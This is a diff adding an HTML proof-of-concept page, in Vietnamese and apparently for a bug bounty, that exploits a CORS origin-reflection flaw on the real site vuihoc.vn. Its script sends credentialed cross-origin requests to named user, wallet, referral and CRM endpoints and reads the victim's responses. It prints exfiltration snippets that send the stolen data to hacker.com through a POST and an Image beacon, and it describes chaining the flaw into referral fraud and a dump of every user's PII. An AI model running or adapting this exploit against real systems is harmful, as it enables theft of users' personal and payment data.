@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC CORS Exploit - vuihoc.vn</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; padding: 20px; margin: 0; }
+        .header { text-align: center; max-width: 900px; margin: 0 auto 20px auto; }
+        .header h2 { color: #c0392b; margin-bottom: 5px; }
+        .header p { color: #555; margin-top: 0; }
+        .log-container {
+            background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 8px;
+            font-family: 'Courier New', monospace; max-width: 900px; margin: 0 auto;
+            max-height: 70vh; overflow-y: auto;
+        }
+        .log-entry { margin-bottom: 6px; padding: 5px; border-bottom: 1px solid #333; word-wrap: break-word; }
+        .status-info { color: #569cd6; }
+        .status-warn { color: #dcdcaa; }
+        .status-error { color: #f44747; }
+        .status-success { color: #4ec9b0; font-weight: bold; }
+        .status-critical { color: #ff6b6b; font-weight: bold; background: #2a1212; padding: 8px; border-radius: 4px; }
+        button {
+            padding: 12px 24px; font-size: 16px; cursor: pointer;
+            background: #c0392b; color: white; border: none; border-radius: 5px; margin: 5px;
+        }
+        button:hover { background: #a93226; }
+        button.secondary { background: #2980b9; }
+        button.secondary:hover { background: #21618c; }
+        pre {
+            background: #2d2d2d; padding: 12px; border-radius: 5px; color: #9cdcfe;
+            white-space: pre-wrap; word-wrap: break-word; margin: 8px 0; border-left: 4px solid #f44747;
+        }
+        .endpoint-list {
+            background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 5px;
+            margin: 10px auto; max-width: 900px; font-family: monospace; font-size: 13px;
+        }
+        .endpoint-list b { color: #856404; }
+        select {
+            padding: 8px; font-size: 14px; border-radius: 4px; border: 1px solid #ccc;
+            margin: 5px; min-width: 400px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h2>PoC: CORS Exploit trên vuihoc.vn (Origin Reflection + Credentials)</h2>
+        <p>Trang này giả lập trang web độc hại của hacker (ví dụ <code>vuihoc-tang-hoc.com</code>)</p>
+    </div>
+
+    <div class="endpoint-list">
+        <b>Hướng dẫn:</b> Để PoC chạy được, bạn cần mở trang này từ domain thật (không phải <code>file://</code>).<br>
+        Cách đơn giản: chạy <code>python3 -m http.server 8000</code> trong folder chứa file HTML, rồi mở <code>http://localhost:8000</code>.<br>
+        <b>Lưu ý:</b> Origin <code>null</code> (khi mở bằng file://) có thể bị chặn bởi một số browser.
+    </div>
+
+    <div style="text-align: center;">
+        <select id="endpointSelect">
+            <option value="https://api.vuihoc.vn/api/v1/users/me">api.vuihoc.vn /api/v1/users/me (CRITICAL - reflect origin)</option>
+            <option value="https://crm-api.vuihoc.vn/api/user/profile">crm-api.vuihoc.vn /api/user/profile (Unauthorized response)</option>
+            <option value="https://api.vuihoc.vn/api/v1/courses">api.vuihoc.vn /api/v1/courses (test endpoint)</option>
+            <option value="https://api.vuihoc.vn/api/v1/wallet">api.vuihoc.vn /api/v1/wallet (wallet endpoint)</option>
+            <option value="https://api.vuihoc.vn/api/v1/referrals">api.vuihoc.vn /api/v1/referrals (referral - chain với Lỗi 4)</option>
+        </select>
+        <br>
+        <button onclick="runExploit()">Bắt đầu Tấn Công</button>
+        <button class="secondary" onclick="clearLog()">Xóa Log</button>
+    </div>
+
+    <div class="log-container" id="consoleLog"></div>
+
+    <script>
+        // ============================================================
+        // CẤU HÌNH
+        // ============================================================
+        let TARGET_API = document.getElementById('endpointSelect').value;
+        const HACKER_ORIGIN = window.location.origin;
+
+        // Cập nhật TARGET_API khi user đổi select
+        document.getElementById('endpointSelect').addEventListener('change', function() {
+            TARGET_API = this.value;
+            log("Đã đổi target: " + TARGET_API, 'warn');
+        });
+
+        // Hàm ghi log ra màn hình
+        function log(message, type = 'info') {
+            const consoleDiv = document.getElementById('consoleLog');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry status-' + type;
+            const timestamp = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span style="color:#888">[${timestamp}]</span> ${message}`;
+            consoleDiv.appendChild(entry);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('consoleLog').innerHTML = '';
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Hiển thị code block
+        function showCode(text) {
+            const pre = document.createElement('pre');
+            pre.textContent = text;
+            document.getElementById('consoleLog').appendChild(pre);
+        }
+
+        // ============================================================
+        // HÀM CHÍNH - CHẠY EXPLOIT
+        // ============================================================
+        async function runExploit() {
+            clearLog();
+            log("═══════════════════════════════════════════════════════════", 'warn');
+            log("  CORS EXPLOIT POC - vuihoc.vn Bug Bounty", 'warn');
+            log("═══════════════════════════════════════════════════════════", 'warn');
+            await sleep(300);
+
+            log("[*] Hacker origin (trang lừa đảo): " + HACKER_ORIGIN, 'info');
+            log("[*] Target API: " + TARGET_API, 'info');
+            log("[*] Kịch bản: Nạn nhân (đã login vuihoc.vn) mở trang lừa đảo", 'info');
+            await sleep(800);
+
+            // ============================================================
+            // BƯỚC 1: KIỂMTRA REQUEST ĐỂ GỬI
+            // ============================================================
+            log("", 'info');
+            log("━━━ BƯỚC 1/4: Chuẩn bị request độc hại ━━━", 'warn');
+            await sleep(500);
+
+            const requestInfo = `fetch("${TARGET_API}", {
+    method: "GET",
+    credentials: "include",        // ← Bắt buộc: gửi kèm cookie của nạn nhân
+    headers: {
+        "Accept": "application/json",
+        "Origin": "${HACKER_ORIGIN}"
+    }
+})`;
+            log("JavaScript chạy trong trình duyệt nạn nhân:", 'info');
+            showCode(requestInfo);
+            await sleep(800);
+
+            log("[*] Trình duyệt sẽ tự động đính kèm cookie vuihoc.vn (session) vào request", 'info');
+            log("[*] Cookie được gửi VÌ credentials: 'include' được set", 'info');
+            await sleep(500);
+
+            // ============================================================
+            // BƯỚC 2: GỬI REQUEST
+            // ============================================================
+            log("", 'info');
+            log("━━━ BƯỚC 2/4: Gửi request từ trình duyệt nạn nhân ━━━", 'warn');
+            await sleep(500);
+            log(`→ GET ${TARGET_API}`, 'info');
+            log(`→ Origin: ${HACKER_ORIGIN}`, 'info');
+            log(`→ Cookie: <tự động đính kèm session của nạn nhân>`, 'info');
+            await sleep(800);
+
+            try {
+                // Gọi API thật
+                const response = await fetch(TARGET_API, {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: {
+                        'Accept': 'application/json'
+                        // KHÔNG set Origin header manually - browser tự thêm!
+                    }
+                });
+
+                await sleep(500);
+
+                // ============================================================
+                // BƯỚC 3: PHÂN TÍCH RESPONSE
+                // ============================================================
+                log("", 'info');
+                log("━━━ BƯỚC 3/4: Server vuihoc trả về response ━━━", 'warn');
+                await sleep(500);
+
+                log(`→ HTTP Status: ${response.status} ${response.statusText}`, 'info');
+                log(`→ Content-Type: ${response.headers.get('Content-Type')}`, 'info');
+
+                // Đọc CORS headers
+                const acao = response.headers.get('Access-Control-Allow-Origin');
+                const acac = response.headers.get('Access-Control-Allow-Credentials');
+                const acam = response.headers.get('Access-Control-Allow-Methods');
+                const acah = response.headers.get('Access-Control-Allow-Headers');
+
+                log(`→ Access-Control-Allow-Origin: ${acao}`, acao === HACKER_ORIGIN ? 'success' : 'info');
+                log(`→ Access-Control-Allow-Credentials: ${acac}`, acac === 'true' ? 'success' : 'info');
+
+                if (acam) log(`→ Access-Control-Allow-Methods: ${acam}`, 'info');
+                if (acah) log(`→ Access-Control-Allow-Headers: ${acah}`, 'info');
+
+                await sleep(500);
+
+                // ============================================================
+                // BƯỚC 4: ĐỌC DATA (chỉ được nếu CORS pass)
+                // ============================================================
+                log("", 'info');
+                log("━━━ BƯỚC 4/4: Phân tích kết quả khai thác ━━━", 'warn');
+                await sleep(500);
+
+                // Check CORS reflection
+                if (acao === HACKER_ORIGIN && acac === 'true') {
+                    log(">>> ✓ LỖI CORS CONFIRMED!", 'critical');
+                    log(">>> Server REFLECT origin của hacker + cho phép credentials", 'critical');
+                    log(">>> Browser sẽ CHO PHÉP JavaScript đọc response body", 'critical');
+                    await sleep(500);
+
+                    // Đọc body
+                    const data = await response.text();
+                    log("", 'info');
+                    log("[*] Response body (data mà hacker đọc được):", 'info');
+                    showCode(data);
+
+                    log("", 'info');
+                    log(">>> PHÂN TÍCH:", 'warn');
+
+                    // Nếu là api.vuihoc.vn - response là 404 "API not found" do endpoint không tồn tại
+                    if (data.includes('API not found')) {
+                        log("→ Endpoint này không tồn tại (404 từ app)", 'info');
+                        log("→ NHƯNG CORS vẫn pass → nếu endpoint đúng, data sẽ bị đọc", 'warn');
+                        log("→ Hacker chỉ cần tìm endpoint thật (vd /api/v1/users/me có auth)", 'warn');
+                        log("→ Khi nạn nhân đã login, response sẽ chứa PII thay vì 404", 'warn');
+                    }
+                    // Nếu là crm-api - "Unauthorized"
+                    else if (data.includes('Unauthorized')) {
+                        log("→ Endpoint tồn tại, trả về 'Unauthorized' vì chưa có token", 'info');
+                        log("→ Nếu nạn nhân đã login CRM và có token trong cookie, data sẽ bị đọc", 'warn');
+                    }
+                    // Nếu có data thật
+                    else {
+                        log("→ ĐÃ LẤY ĐƯỢC DATA THẬT!", 'critical');
+                        log("→ Hacker có thể exfil data này về server của mình", 'critical');
+                    }
+
+                    // Show exfiltration code
+                    await sleep(500);
+                    log("", 'info');
+                    log("[*] Code exfiltrate data về server hacker:", 'info');
+                    const exfilCode = `// Hacker có thể thêm đoạn này để gửi data về server:
+fetch('https://hacker.com/collect', {
+    method: 'POST',
+    body: data  // data PII của nạn nhân
+});
+
+// Hoặc dùng Image để bypass CORS:
+new Image().src = 'https://hacker.com/log?data=' + btoa(data);`;
+                    showCode(exfilCode);
+
+                } else if (acao === '*') {
+                    log(">>> Server trả ACAO: * (wildcard)", 'warn');
+                    log(">>> Nhưng ACAC: true + wildcard → browser CHẶN đọc response", 'error');
+                    log(">>> Lỗi này chưa exploit được ngay (nhưng là latent risk)", 'warn');
+                    log(">>> Nếu dev đổi wildcard sang reflection → sẽ thành critical ngay", 'warn');
+
+                    try {
+                        const data = await response.text();
+                        log("", 'info');
+                        log("[*] Response body (NHƯNG JavaScript không đọc được):", 'info');
+                        showCode(data);
+                    } catch (e) {
+                        log("[*] Không đọc được body do CORS chặn: " + e.message, 'error');
+                    }
+
+                } else if (!acao) {
+                    log(">>> Server không trả ACAO header", 'error');
+                    log(">>> Browser chặn cross-origin read", 'error');
+                    log(">>> CORS hoạt động đúng (an toàn)", 'success');
+
+                } else {
+                    log(`>>> Server trả ACAO: ${acao} (không match hacker origin)`, 'warn');
+                    log(">>> Browser chặn cross-origin read", 'error');
+                }
+
+            } catch (error) {
+                log("", 'info');
+                log(">>> LỖI khi gửi request: " + error.message, 'error');
+                log(">>> Có thể nguyên nhân:", 'error');
+                log("    - Browser block vì CORS fail (không có ACAO)", 'info');
+                log("    - Network error", 'info');
+                log("    - Cookie SameSite=Strict/Lax (không gửi cross-origin)", 'info');
+                log("    - Mixed content (HTTP origin → HTTPS API)", 'info');
+            }
+
+            // ============================================================
+            // KẾT LUẬN
+            // ============================================================
+            log("", 'info');
+            log("═══════════════════════════════════════════════════════════", 'warn');
+            log("  KẾT LUẬN", 'warn');
+            log("═══════════════════════════════════════════════════════════", 'warn');
+            log("Nếu PoC này chạy từ domain hacker thật (evil.com), và nạn nhân đã", 'info');
+            log("login vuihoc.vn, hacker có thể đọc bất kỳ API response nào mà", 'info');
+            log("nạn nhân được phép truy cập — bao gồm PII, payment, lịch sử học.", 'info');
+            log("", 'info');
+            log("Chain với Lỗi 4 (referral không expire):", 'warn');
+            log("  1. Hacker lấy referral code của nạn nhân qua CORS", 'info');
+            log("  2. Dùng referral code → học miễn phí vô thời hạn", 'info');
+            log("  3. Hoặc enumerate user_id → dump PII toàn bộ user vuihoc", 'info');
+        }
+    </script>
+</body>
+</html>
